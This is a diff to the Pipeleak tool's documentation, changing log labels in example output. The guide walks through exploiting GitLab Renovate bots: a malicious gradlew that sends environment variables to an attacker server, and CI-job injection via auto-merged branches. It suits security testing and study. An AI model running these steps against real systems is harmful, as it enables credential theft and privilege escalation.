@@ -33,10 +33,10 @@ For example, we enumerated Renovate configs found on GitLab.com. One project was
 
 ```bash
 pipeleak gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
-2025-09-30T07:11:06Z INF Fetching projects
-2025-09-30T07:11:12Z WRN Identified Renovate (bot) configuration autodiscoveryFilterType= autodiscoveryFilterValue= hasAutodiscovery=true hasAutodiscoveryFilters=false hasConfigFile=true pipelines=enabled selfHostedConfigFile=true url=https://gitlab.com/test-group/renovate-bot
-2025-09-30T07:11:16Z INF Fetched all projects
-2025-09-30T07:11:16Z INF Done, Bye Bye 🏳️‍🌈🔥
+2025-09-30T07:11:06Z info Fetching projects
+2025-09-30T07:11:12Z warn Identified Renovate (bot) configuration autodiscoveryFilterType= autodiscoveryFilterValue= hasAutodiscovery=true hasAutodiscoveryFilters=false hasConfigFile=true pipelines=enabled selfHostedConfigFile=true url=https://gitlab.com/test-group/renovate-bot
+2025-09-30T07:11:16Z info Fetched all projects
+2025-09-30T07:11:16Z info Done, Bye Bye 🏳️‍🌈🔥
 ```
 
 This makes the bot susceptible to autodiscovery exploits, since it will renovate any repository it can access.
@@ -53,16 +53,16 @@ The following command creates a repository that includes an exploit script calle
 
 ```bash
 pipeleak gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] -v
-2025-09-30T07:19:33Z INF Created project name=devfe-pipeleak-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleak-renovate-autodiscovery-poc
-2025-09-30T07:19:35Z DBG Created file fileName=renovate.json
-2025-09-30T07:19:35Z DBG Created file fileName=build.gradle
-2025-09-30T07:19:36Z DBG Created file fileName=gradlew
-2025-09-30T07:19:36Z DBG Created file fileName=gradle/wrapper/gradle-wrapper.properties
-2025-09-30T07:19:37Z DBG Created file fileName=exploit.sh
-2025-09-30T07:19:37Z INF This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'
-2025-09-30T07:19:37Z INF When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh
-2025-09-30T07:19:37Z INF Make sure to update the exploit.sh script with the actual exploit code
-2025-09-30T07:19:37Z INF Then wait until the created project is renovated by the invited Renovate Bot user
+2025-09-30T07:19:33Z info Created project name=devfe-pipeleak-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleak-renovate-autodiscovery-poc
+2025-09-30T07:19:35Z debug Created file fileName=renovate.json
+2025-09-30T07:19:35Z debug Created file fileName=build.gradle
+2025-09-30T07:19:36Z debug Created file fileName=gradlew
+2025-09-30T07:19:36Z debug Created file fileName=gradle/wrapper/gradle-wrapper.properties
+2025-09-30T07:19:37Z debug Created file fileName=exploit.sh
+2025-09-30T07:19:37Z info This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'
+2025-09-30T07:19:37Z info When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh
+2025-09-30T07:19:37Z info Make sure to update the exploit.sh script with the actual exploit code
+2025-09-30T07:19:37Z info Then wait until the created project is renovated by the invited Renovate Bot user
 ```
 
 First, set up the `exploit.sh` script according to your needs. The goal is to read the Renovate process environment variables and exfiltrate them to your attacker server.
@@ -95,7 +95,7 @@ On your attacker server, start a [GoShs](https://github.com/patrickhener/goshs) 
 
 ```bash
 ./goshs --ssl --self-signed --upload-only -no-clipboard --no-delete --port 8000
-INFO   [2025-09-30 09:31:29] You are running the newest version (v1.1.1) of goshs
+infoO   [2025-09-30 09:31:29] You are running the newest version (v1.1.1) of goshs
 ```
 
 Next, identify the bot user and invite it to your repository. By looking at the Renovate bot configuration, you can identify the renovated repos and check the username of the bot user in the merge requests created by that bot.
@@ -122,23 +122,23 @@ Using Pipeleak, you can monitor your repository for new Renovate branches. When 
 
 ```bash
 pipeleak gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repo-name company1/a-software-project --renovate-branches-regex 'renovate/.*' -v
-2025-09-30T07:56:57Z DBG Verbose log output enabled
-2025-09-30T07:56:57Z INF Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch
-2025-09-30T07:56:58Z DBG Testing push access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
-2025-09-30T07:56:58Z DBG Testing merge access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
-2025-09-30T07:56:58Z INF Default branch is protected and you do not have direct access, proceeding with exploit branch=main currentAccessLevel=30
-2025-09-30T07:56:58Z INF Monitoring for new Renovate Bot branches to exploit
-2025-09-30T07:56:58Z DBG Checking for new branches created by Renovate Bot
-2025-09-30T07:56:58Z DBG Storing original branches for comparison
-2025-09-30T07:56:58Z DBG Checking for new branches created by Renovate Bot
-2025-09-30T07:57:30Z DBG Checking for new branches created by Renovate Bot
-2025-09-30T07:57:30Z INF Checking if new branch matches Renovate Bot regex branch=renovate/update-lib1
-2025-09-30T07:57:30Z INF Identified Renovate Bot branch, starting exploit process branch=renovate/update-lib1
-2025-09-30T07:57:30Z INF Fetching .gitlab-ci.yml file from Renovate branch branch=renovate/update-lib1
-2025-09-30T07:57:30Z INF Modifying .gitlab-ci.yml file in Renovate branch branch=renovate/update-lib1
-2025-09-30T07:57:31Z INF Updated remote .gitlab-ci.yml file in Renovate branch branch=renovate/update-lib1 fileinfo={"branch":"renovate/update-lib1","file_path":".gitlab-ci.yml"}
-2025-09-30T07:57:31Z INF CI/CD configuration updated, check yourself if we won the race! branch=renovate/update-lib1
-2025-09-30T07:57:31Z INF If Renovate automatically merges the branch, you have successfully exploited the privilege escalation vulnerability and injected a job into the CI/CD pipeline that runs on the default branch
+2025-09-30T07:56:57Z debug Verbose log output enabled
+2025-09-30T07:56:57Z info Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch
+2025-09-30T07:56:58Z debug Testing push access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
+2025-09-30T07:56:58Z debug Testing merge access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
+2025-09-30T07:56:58Z info Default branch is protected and you do not have direct access, proceeding with exploit branch=main currentAccessLevel=30
+2025-09-30T07:56:58Z info Monitoring for new Renovate Bot branches to exploit
+2025-09-30T07:56:58Z debug Checking for new branches created by Renovate Bot
+2025-09-30T07:56:58Z debug Storing original branches for comparison
+2025-09-30T07:56:58Z debug Checking for new branches created by Renovate Bot
+2025-09-30T07:57:30Z debug Checking for new branches created by Renovate Bot
+2025-09-30T07:57:30Z info Checking if new branch matches Renovate Bot regex branch=renovate/update-lib1
+2025-09-30T07:57:30Z info Identified Renovate Bot branch, starting exploit process branch=renovate/update-lib1
+2025-09-30T07:57:30Z info Fetching .gitlab-ci.yml file from Renovate branch branch=renovate/update-lib1
+2025-09-30T07:57:30Z info Modifying .gitlab-ci.yml file in Renovate branch branch=renovate/update-lib1
+2025-09-30T07:57:31Z info Updated remote .gitlab-ci.yml file in Renovate branch branch=renovate/update-lib1 fileinfo={"branch":"renovate/update-lib1","file_path":".gitlab-ci.yml"}
+2025-09-30T07:57:31Z info CI/CD configuration updated, check yourself if we won the race! branch=renovate/update-lib1
+2025-09-30T07:57:31Z info If Renovate automatically merges the branch, you have successfully exploited the privilege escalation vulnerability and injected a job into the CI/CD pipeline that runs on the default branch
 ```
 
 Manually check if the merge request has been set to auto-merge, and see if your changes land in the main branch. If they do, you have successfully injected a CI/CD job into the protected branch. From there, leak all the credentials and continue your attack path.
